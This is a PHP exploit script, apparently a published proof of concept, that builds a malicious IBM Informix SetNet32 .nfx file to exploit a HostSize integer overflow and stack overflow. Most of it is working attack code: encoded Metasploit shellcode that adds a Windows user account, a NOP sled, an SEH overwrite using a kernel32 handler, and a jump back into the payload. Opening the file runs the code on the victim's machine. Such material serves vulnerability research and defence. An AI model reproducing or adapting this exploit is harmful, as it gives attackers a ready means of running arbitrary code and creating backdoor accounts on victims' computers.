<?php
/* IBM Informix Client SDK 3.0 SetNet32 File (.nfx) Hostsize integer overflow exploit
   (2k3 sp0)
   by Nine:Situations:Group::bruiser
   site: http://retrogod.altervista.org/

   vulnerable packages: IBM Informix Client SDK 3.0,
   IBM Informix Connect Runtime 3.x,
   possibly other products carrying the setnet32 utility.

   User-supplied value for the Hostsize field results in an integer overflow and
   subsequently a complete stack smash by passing an overlong string to the HostList
   one allowing an attacker to execute arbitrary code.
   All modules in memory are compiled with /SAFESEH=on but it's still possible to
   execute arbitrary code by passing a certain trusted handler from kernel32.dll.
   We fall in a more convenient condition with eip overwritten: now ebp register
   points to a portion of our buffer. So this is context-dependent, try aganst
   another OS.
   Other attacks are possible through the ProtoSize or ServerSize fields.
   It works by double clicking on the resulting .nfx file.

*/

# windows/adduser - 436 bytes
# http://www.metasploit.com
# Encoder: x86/alpha_mixed
# EXITFUNC=seh, USER=sun, PASS=tzu
$_scode=
"\x89\xe1\xd9\xc2\xd9\x71\xf4\x5b\x53\x59\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51" .
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32" .
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" .
"\x42\x75\x4a\x49\x4b\x4c\x4a\x48\x50\x44\x43\x30\x45\x50" .
"\x43\x30\x4c\x4b\x50\x45\x47\x4c\x4c\x4b\x43\x4c\x45\x55" .
"\x43\x48\x43\x31\x4a\x4f\x4c\x4b\x50\x4f\x45\x48\x4c\x4b" .
"\x51\x4f\x47\x50\x45\x51\x4a\x4b\x47\x39\x4c\x4b\x46\x54" .
"\x4c\x4b\x43\x31\x4a\x4e\x50\x31\x49\x50\x4c\x59\x4e\x4c" .
"\x4d\x54\x49\x50\x44\x34\x44\x47\x49\x51\x49\x5a\x44\x4d" .
"\x45\x51\x48\x42\x4a\x4b\x4b\x44\x47\x4b\x51\x44\x47\x54" .
"\x44\x44\x44\x35\x4b\x55\x4c\x4b\x51\x4f\x47\x54\x45\x51" .
"\x4a\x4b\x42\x46\x4c\x4b\x44\x4c\x50\x4b\x4c\x4b\x51\x4f" .
"\x45\x4c\x43\x31\x4a\x4b\x4c\x4b\x45\x4c\x4c\x4b\x45\x51" .
"\x4a\x4b\x4c\x49\x51\x4c\x47\x54\x45\x54\x48\x43\x51\x4f" .
"\x46\x51\x4c\x36\x43\x50\x46\x36\x42\x44\x4c\x4b\x51\x56" .
"\x50\x30\x4c\x4b\x47\x30\x44\x4c\x4c\x4b\x44\x30\x45\x4c" .
"\x4e\x4d\x4c\x4b\x45\x38\x44\x48\x4b\x39\x4a\x58\x4c\x43" .
"\x49\x50\x43\x5a\x50\x50\x43\x58\x4c\x30\x4d\x5a\x45\x54" .
"\x51\x4f\x45\x38\x4d\x48\x4b\x4e\x4d\x5a\x44\x4e\x51\x47" .
"\x4b\x4f\x4d\x37\x45\x33\x42\x4d\x45\x34\x46\x4e\x45\x35" .
"\x44\x38\x43\x55\x51\x30\x46\x4f\x45\x33\x47\x50\x42\x4e" .
"\x42\x45\x43\x44\x47\x50\x44\x35\x42\x53\x43\x55\x42\x52" .
"\x47\x50\x43\x43\x43\x45\x42\x4e\x51\x30\x43\x44\x43\x4a" .
"\x43\x45\x51\x30\x46\x4f\x51\x51\x47\x34\x47\x34\x51\x30" .
"\x46\x46\x47\x56\x47\x50\x42\x4e\x45\x35\x43\x44\x51\x30" .
"\x42\x4c\x42\x4f\x43\x53\x43\x51\x42\x4c\x42\x47\x42\x52" .
"\x42\x4f\x42\x55\x42\x50\x51\x30\x51\x51\x45\x34\x42\x4d" .
"\x43\x59\x42\x4e\x45\x39\x43\x43\x42\x54\x43\x42\x43\x51" .
"\x43\x44\x42\x4f\x44\x32\x42\x53\x47\x50\x42\x53\x44\x35" .
"\x42\x4e\x47\x50\x46\x4f\x47\x31\x50\x44\x47\x34\x45\x50" .
"\x41\x41";

$____boom =
"[Setnet32]\r\n".
"Format=\x203.00\x203.00.TC1\x20\x20\r\n".
"[ENVIRONMENT]\r\n".
"CC8BITLEVEL=\r\n".
"CLIENT_LOCALE=EN_US.8859-1\r\n".
"COLLCHAR=\r\n".
"CONRETRY=\r\n".
"CONTIME=\r\n".
"DB2CLI=\r\n".
"DBANSIWARN=\r\n".
"DBDATE=\r\n".
"DBLANG=EN_US.CP1252\r\n".
"DBMONEY=\r\n".
"DBNLS=\r\n".
"DBPATH=\r\n".
"DBTEMP=\r\n".
"DBTIME=\r\n".
"DELIMIDENT=n\r\n".
"ESQLMF=\r\n".
"FET_BUF_SIZE=\r\n".
"BIG_FET_BUF_SIZE=\r\n".
"IFX_MULTIPREPSTMT=\r\n".
"GL_DATE=\r\n".
"GL_DATETIME=\r\n".
"IFX_EXTDIRECTIVES=\r\n".
"IFX_XASTDCOMPLIANCE_XAEND=\r\n".
"IFX_DIRTY_WAIT=\r\n".
"INFORMIXDIR=C:\Program\x20Files\IBM\Informix\Connect\\r\n".
"INFORMIXSERVER=aaaaaaaaaaaa\r\n".
"INFORMIXSQLHOSTS=\r\n".
"LANG=\r\n".
"LC_COLLATE=\r\n".
"LC_CTYPE=\r\n".
"LC_MONETARY=\r\n".
"LC_NUMERIC=\r\n".
"LC_TIME=\r\n".
"DBALSBC=\r\n".
"DBAPICODE=\r\n".
"DBASCIIBC=\r\n".
"DBCENTURY=\r\n".
"DBCODESET=\r\n".
"DBCONNECT=\r\n".
"DBCSCONV=\r\n".
"DBCSOVERRIDE=\r\n".
"DBCSWIDTH=\r\n".
"DBFLTMSK=\r\n".
"DBMONEYSCALE=\r\n".
"DBSS2=\r\n".
"DBSS3=\r\n".
"IFX_AUTOFREE=\r\n".
"IFX_DEFERRED_PREPARE=\r\n".
"NODEFDAC=\r\n".
"OPTMSG=\r\n".
"OPTOFC=\r\n".
"IFX_USE_PREC_16=\r\n".
"IFX_PAD_VARCHAR=\r\n".
"NOZEROMDY=\r\n".
"BLANK_STRINGS_NOT_NULL=\r\n".
"IFX_FLAT_UCSQ=\r\n".
"[Size]\r\n".
"CLIENT_LOCALE=12\r\n".
"DB_LOCALE=0\r\n".
"NumOfHosts=999\r\n".
"NumOfServers=1\r\n".
"NumOfProtocols=9\r\n".
"ServerSize=16\r\n".

"HostSize=1517\r\n".                                //boom!!

"ProtoSize=16\r\n".
"[Lists]\r\n".
"INFORMIXSERVERLIST=aaaa;\r\n".
"HostList=".

str_repeat("\x90",312).

$_scode.

str_repeat("\x90",1115 - strlen($_scode)).

"\xe9\x01\xfb\xff\xff".                             //jmp back to shellcode
"\x90\x90\x90\x90".                                 //junk, this is overwritten in some way
"\x87\x35\xe4\x77".                                 //pointer to the next SEH record
"\x87\x35\xe4\x77".                                 //SE handler, a registered one from kernel32.dll
"\xC0\xF0\x03\xF1".                                 //do not touch
"\x41\x41\x41\x41".                                 //do not touch
"\x9b\x71\xd8\x77".                                 //call ebp, user32.dll and further jno short
str_repeat("\x9b\x71\xd8\x77",64).                  //do not touch
";\r\n".
"PROTOCOLLIST=olsoctcp;onsoctcp;olsocspx;onsocspx;sesoctcp;sesocspx;seipcpip;olipcnmp;onipcnmp;\r\n".
"[__infx_sqlhost_aaaaaaaaaaaaaaa]\r\n".
"HOST=\r\n".
"SERVICE=1527\r\n".
"PROTOCOL=olsoctcp\r\n".
"OPTIONS=\r\n".
"[__infx_host_192.168.0.1]\r\n".
"USER=informix\r\n".
"PASS=EP\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20".
"\x200\x20\x200\x20\x200\x20\x200\x20\x200\r\n".
"AskPassword=P\r\n".
"[__infx_host_192.168.0.2]\r\n".
"USER=aaaa\r\n".
"PASS=EP\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x2049\x20\x200\x20\x200\x20\x20".
"0\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\r\n".
"AskPassword=P\r\n".
"[__infx_host_192.168.0.3]\r\n".
"USER=informix\r\n".
"PASS=EP\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x20".
"0\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\x20\x200\r\n".
"AskPassword=P\r\n".
"\x00";

file_put_contents("9sg.nfx",$____boom);
?>